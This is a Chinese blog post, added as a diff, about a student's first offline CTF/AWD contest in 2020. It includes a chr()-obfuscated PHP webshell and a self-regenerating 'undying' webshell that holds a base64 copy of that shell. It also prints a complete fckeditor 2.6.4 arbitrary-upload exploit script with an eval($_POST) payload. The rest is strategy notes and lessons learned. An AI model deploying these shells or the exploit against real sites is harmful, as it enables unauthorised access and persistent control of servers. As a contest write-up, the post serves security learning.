@@ -1,0 +1,573 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>2020河北省赛线下经验总结 - Yueyejian’s Blog</title>
+<meta name="description" content="0x00 写在前面 这是在比赛开始之前，分工后自己简单写的一个比赛思路。 1. 修改ssh {passwd}  &amp;&amp;   修改mysql{set password = password(&#39;password&#39;);}  2. 备份源码 3. 扫描源码 4. 简单审计 上waf 删除一句话 删站观察是否check 5. 利用一句话去打别人 流量混淆  webshell混淆  权限维持 6. （主机发现） 7. 提权 办ip 修改php.ini禁用危险函数 8. 目录扫描 漏洞挖掘  0x01 开干 SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="2020河北省赛线下经验总结">
+<meta property="og:url" content="http://localhost:4000/tricks/awd/">
+
+
+  <meta property="og:description" content="0x00 写在前面 这是在比赛开始之前，分工后自己简单写的一个比赛思路。 1. 修改ssh {passwd}  &amp;&amp;   修改mysql{set password = password(&#39;password&#39;);}  2. 备份源码 3. 扫描源码 4. 简单审计 上waf 删除一句话 删站观察是否check 5. 利用一句话去打别人 流量混淆  webshell混淆  权限维持 6. （主机发现） 7. 提权 办ip 修改php.ini禁用危险函数 8. 目录扫描 漏洞挖掘  0x01 开干 SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-11-30T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/tricks/awd/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico">
+<!-- end custom head snippets -->
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a>
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a>yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">ワノ国</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="2020河北省赛线下经验总结">
+    <meta itemprop="description" content="0x00 写在前面这是在比赛开始之前，分工后自己简单写的一个比赛思路。1. 修改ssh {passwd}  &amp;&amp;   修改mysql{set password = password(&#39;password&#39;);} 2. 备份源码3. 扫描源码4. 简单审计 上waf 删除一句话 删站观察是否check5. 利用一句话去打别人 流量混淆  webshell混淆  权限维持6. （主机发现）7. 提权 办ip 修改php.ini禁用危险函数8. 目录扫描 漏洞挖掘0x01 开干SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。">
+    <meta itemprop="datePublished" content="2020-11-30T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">2020河北省赛线下经验总结
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-11-30T00:00:00+08:00">November 30, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#0x00-写在前面">0x00 写在前面</a></li><li><a href="#0x01-开干">0x01 开干</a></li><li><a href="#0x02-赛后反思">0x02 赛后反思</a><ul><li><a href="#ctf">CTF</a></li><li><a href="#awd">AWD</a></li></ul></li><li><a href="#0x03-写在最后">0x03 写在最后</a></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h2 id="0x00-写在前面">0x00 写在前面</h2>
+<p>这是在比赛开始之前，分工后自己简单写的一个比赛思路。</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 修改ssh {passwd}  &amp;&amp;   修改mysql{set password = password('password');} 
+2. 备份源码
+3. 扫描源码
+4. 简单审计 上waf 删除一句话 删站观察是否check
+5. 利用一句话去打别人 流量混淆  webshell混淆  权限维持
+6. （主机发现）
+7. 提权 办ip 修改php.ini禁用危险函数
+8. 目录扫描 漏洞挖掘
+</code></pre></div></div>
+<h2 id="0x01-开干">0x01 开干</h2>
+<p>SSH连上之后，居然发现自己是root！因为于是我找到php配置文件 php.ini，禁用了一些危险函数，上完 waf之后就开始攻击别的队伍了。</p>
+
+<p>很快找到了一个文件上传漏洞，很快上传了一个webshell，密码是yueyejian</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(39).$_uU(121).$_uU(117).$_uU(101).$_uU(121).$_uU(101).$_uU(106).$_uU(105).$_uU(97).$_uU(110).$_uU(39).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?&gt;
+</code></pre></div></div>
+
+<p>然后再网站主页上传了内存木马俗称不死马，会自动生成上面内容的webshell</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+ ignore_user_abort(true);
+ set_time_limit(0);
+ $file = 'webshell.php';
+ $code = base64_decode('PD9waHAgJF91VT1jaHIoOTkpLmNocigxMDQpLmNocigxMTQpOyRfY0M9JF91VSgxMDEpLiRfdVUoMTE4KS4kX3VVKDk3KS4kX3VVKDEwOCkuJF91VSg0MCkuJF91VSgzNikuJF91VSg5NSkuJF91VSg4MCkuJF91VSg3OSkuJF91VSg4MykuJF91VSg4NCkuJF91VSg5MSkuJF91VSgzOSkuJF91VSgxMjEpLiRfdVUoMTE3KS4kX3VVKDEwMSkuJF91VSgxMjEpLiRfdVUoMTAxKS4kX3VVKDEwNikuJF91VSgxMDUpLiRfdVUoOTcpLiRfdVUoMTEwKS4kX3VVKDM5KS4kX3VVKDkzKS4kX3VVKDQxKS4kX3VVKDU5KTskX2ZGPSRfdVUoOTkpLiRfdVUoMTE0KS4kX3VVKDEwMSkuJF91VSg5NykuJF91VSgxMTYpLiRfdVUoMTAxKS4kX3VVKDk1KS4kX3VVKDEwMikuJF91VSgxMTcpLiRfdVUoMTEwKS4kX3VVKDk5KS4kX3VVKDExNikuJF91VSgxMDUpLiRfdVUoMTExKS4kX3VVKDExMCk7JF89JF9mRigiIiwkX2NDKTtAJF8oKTs/Pg==');
+ while(true) {
+     if(md5(file_get_contents($file))!==md5($code)) {
+         file_put_contents($file, $code);
+     }
+     usleep(50);
+ }
+?&gt;
+</code></pre></div></div>
+
+<p>就这样试了试了很多ip，很多已经做好防御了，或者网站已经被打没了，最后只拿到了两三个 webshell。这里总结了一个教训，如果会写重放的脚本，就不用一个一个慢慢上传了，直接一键在所有靶机上尝试种 webshell</p>
+
+<h2 id="0x02-赛后反思">0x02 赛后反思</h2>
+<p>这次是第一次打awd，并没有拿到什么奖，但是积累了很多经验，发现了自己的很多不足，也是一次非常有意义的比赛了。</p>
+
+<p>比赛分两天进行，第1天是ctf，第2天才是awd。</p>
+
+<h3 id="ctf">CTF</h3>
+<p>第一天的ctf就给我好好上了一课。web2是一个写文章的小网站，简单测试发现存在 sql注入和 xss，数据库里面并没有发现什么可以利用的信息，然后超级密码可以直接登录 admin，所以也没有再考虑 xss拿cookie了。这里就草率了，之前看到过sql注入也可以 getshell，但是没有好好去学，最后讨论说思路就是用sql注入来读取文件，歪日了。</p>
+
+<p>扫描后发现用到了 fckeditor，这里开始就有点坑了。首先是查看 fckeditor版本信息发现是 2.6.4</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1/fckeditor/editor/dialog/fck_about.html
+http://127.0.0.1/FCKeditor/_whatsnew.html
+</code></pre></div></div>
+<p>找到了这个存在漏洞的网页</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/editor/filemanager/connectors/php/connector.php
+</code></pre></div></div>
+<p>于是我就利用这个poc去打，脚本老是运行不成功。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>
+<span class="c1">//fckeditor &lt;= 2.6.4 任意文件上传漏洞, php coldfunsion应该KO了，asp表示很淡定，其他语言版本未测</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s2">"default_socket_timeout"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="no">STDIN</span><span class="p">,</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"php://stdin"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">));</span>
+<span class="nv">$match</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="k">function</span> <span class="n">http_send</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$packet</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="mi">80</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[-] No response from </span><span class="si">{</span><span class="nv">$host</span><span class="si">}</span><span class="s2">:80 Trying again..."</span><span class="p">;</span>
+<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="mi">80</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">fputs</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$packet</span><span class="p">);</span>
+<span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="nv">$resp</span> <span class="mf">.</span><span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="k">print</span> <span class="nv">$resp</span><span class="p">;</span>
+<span class="k">return</span> <span class="nv">$resp</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">connector_response</span><span class="p">(</span><span class="nv">$html</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">global</span> <span class="nv">$match</span><span class="p">;</span>
+<span class="k">return</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/OnUploadCompleted\((\d),</span><span class="se">\"</span><span class="s2">(.*)</span><span class="se">\"</span><span class="s2">\)/"</span><span class="p">,</span> <span class="nv">$html</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">201</span><span class="p">)));</span>
+<span class="p">}</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">+------------------------------------------------------------------+"</span><span class="p">;</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">| FCKEditor Servelet Arbitrary File Upload Exploit by Wolegequ |"</span><span class="p">;</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">+------------------------------------------------------------------+</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Usage......: php </span><span class="nv">$argv[0]</span><span class="s2"> host path</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Example....: php </span><span class="nv">$argv[0]</span><span class="s2"> localhost /</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Example....: php </span><span class="nv">$argv[0]</span><span class="s2"> localhost /FCKEditor/</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nv">$host</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">"(/)</span><span class="si">{</span><span class="nv">2,</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="nv">$filename</span> <span class="o">=</span> <span class="s2">"fvck.gif"</span><span class="p">;</span>
+<span class="nv">$foldername</span> <span class="o">=</span> <span class="s2">"fuck.php%00.gif"</span><span class="p">;</span>
+<span class="nv">$connector</span> <span class="o">=</span> <span class="s2">"editor/filemanager/connectors/php/connector.php"</span><span class="p">;</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="s2">"-----------------------------265001916915724</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$payload</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s2">NewFile</span><span class="se">\"</span><span class="s2">; filename=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="se">\"\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$payload</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Content-Type: image/jpeg</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$payload</span> <span class="mf">.</span><span class="o">=</span> <span class="s1">'GIF89a'</span><span class="mf">.</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="mf">.</span><span class="s1">'&lt;?php eval($_POST[a]) ?&gt;'</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$payload</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"-----------------------------265001916915724--</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$packet</span> <span class="o">=</span> <span class="s2">"POST </span><span class="si">{</span><span class="nv">$path</span><span class="si">}{</span><span class="nv">$connector</span><span class="si">}</span><span class="s2">?Command=FileUpload&amp;Type=Image&amp;CurrentFolder="</span><span class="mf">.</span><span class="nv">$foldername</span><span class="mf">.</span><span class="s2">" HTTP/1.0</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="c1">//print $packet;</span>
+<span class="nv">$packet</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Host: </span><span class="si">{</span><span class="nv">$host</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$packet</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Content-Type: multipart/form-data; boundary=---------------------------265001916915724</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$packet</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Content-Length: "</span><span class="mf">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$payload</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$packet</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"Connection: close</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="nv">$packet</span> <span class="mf">.</span><span class="o">=</span> <span class="nv">$payload</span><span class="p">;</span>
+<span class="k">print</span> <span class="nv">$packet</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">connector_response</span><span class="p">(</span><span class="nf">http_send</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$packet</span><span class="p">)))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">[-] Upload failed!</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="k">else</span> <span class="k">print</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[-] Job done! try http://${host}/</span><span class="nv">$match[2]</span><span class="s2"> </span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+<p>于是我手动发包成功了，返回了一个上传路径，类似以下图片（当时没有截图），但是我却怎么也访问不到我上传的一句话文件</p>
+
+<p><img src="/images/tricks/awd/1.png" alt="" /></p>
+
+<p>搞了两个小时，还是没有利用成功。赛后出题人说这道题的思路就是 sql注入利用，还有xss，我人傻了。出题人说这个网站本来存在挺多漏洞的，他都修好了，沃日，修好了也不提醒一下。于是ctf就这样含恨结束了。</p>
+
+<h3 id="awd">AWD</h3>
+
+<p>AWD的不足就更多了，比赛开始之后并没有给半小时防御时间，所以一开赛有一点慌了，忘记备份数据库和修改数据库密码，导致后面大佬把数据库搞没了，也恢复不过来。</p>
+
+<p>键入 whoami的时候发现是 root权限，可以办 ip，这样别人就打不进来了，但是没有办。</p>
+
+<p>获取 flag的方式是 curl 一个主办方提供的网址，然后会回显 flag。当时直接把自己靶机上的 curl删了不就好了。</p>
+
+<p>没有把 html目录改成755 root root，网站很多文件都是 www-data www-data，别人拿到 webshell可以直接删站。</p>
+
+<p>没有把大佬上传的 webshell拷贝下来研究。</p>
+
+<p>不会杀不死马。</p>
+
+<p>分析流量日志。</p>
+
+<p>不会写批量脚本，这也是很致命的一点。</p>
+
+<p>上传的 webshell也是最简单的不死马，现在什么蠕虫webshell都有了，但是自己从来没有了解过。</p>
+
+<h2 id="0x03-写在最后">0x03 写在最后</h2>
+<p>这也不会，那也不会。赛前还大放厥词说要干翻xxx学校，结果被人按在地上来回摩擦。希望半年之内能把自己不会的东西都掌握好，同时也不能再挂科了。</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#awd" class="page__taxonomy-item" rel="tag">awd</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#tricks" class="page__taxonomy-item" rel="tag">tricks</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-11-30T00:00:00+08:00">November 30, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/tricks/crontab/" class="pagination--pager" title="Linux - Crontab
+">Previous</a>
+    
+    
+      <a href="/tricks/lfi-files/" class="pagination--pager" title="LFI - 可利用敏感文件
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2019-2024 Yueyejian. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
